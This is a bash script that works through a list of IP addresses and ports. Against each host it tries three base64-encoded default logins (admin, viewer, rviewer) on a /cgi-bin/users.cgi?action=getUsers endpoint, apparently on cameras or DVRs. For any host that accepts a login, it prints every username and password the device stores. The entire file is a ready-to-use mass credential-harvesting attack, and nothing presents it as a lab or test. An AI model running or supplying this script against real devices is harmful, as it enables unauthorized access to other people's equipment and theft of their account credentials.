#!/bin/bash

hashes=("YWRtaW46YWRtaW4=" "dmlld2VyOnZpZXdlcg==" "cnZpZXdlcjpydmlld2Vy")

file="$1"
if [ -z "$file" ]; then
    echo "Usage: $0 <file>"
    exit 1
fi

while read -r ip port; do
    if [ -z "$ip" ] || [ -z "$port" ]; then
        echo "Skipping invalid line: $ip $port"
        continue
    fi

    echo "Testing IP: $ip on Port: $port"

    for auths in "${hashes[@]}"; do
        content=$(curl -s -H "Authorization: Basic $auths" "http://$ip:$port/cgi-bin/users.cgi?action=getUsers")

        if [ -z "$content" ] || [[ "$content" == *"401"* ]]; then
            echo "Authentication failed for: $auths"
            continue
        fi

        echo "$content" | awk -F '=' '
        /username=/ {user=$2} 
        /password=/ {print "User: " user ", Password: " $2}
        '

        break
    done

done < "$file"

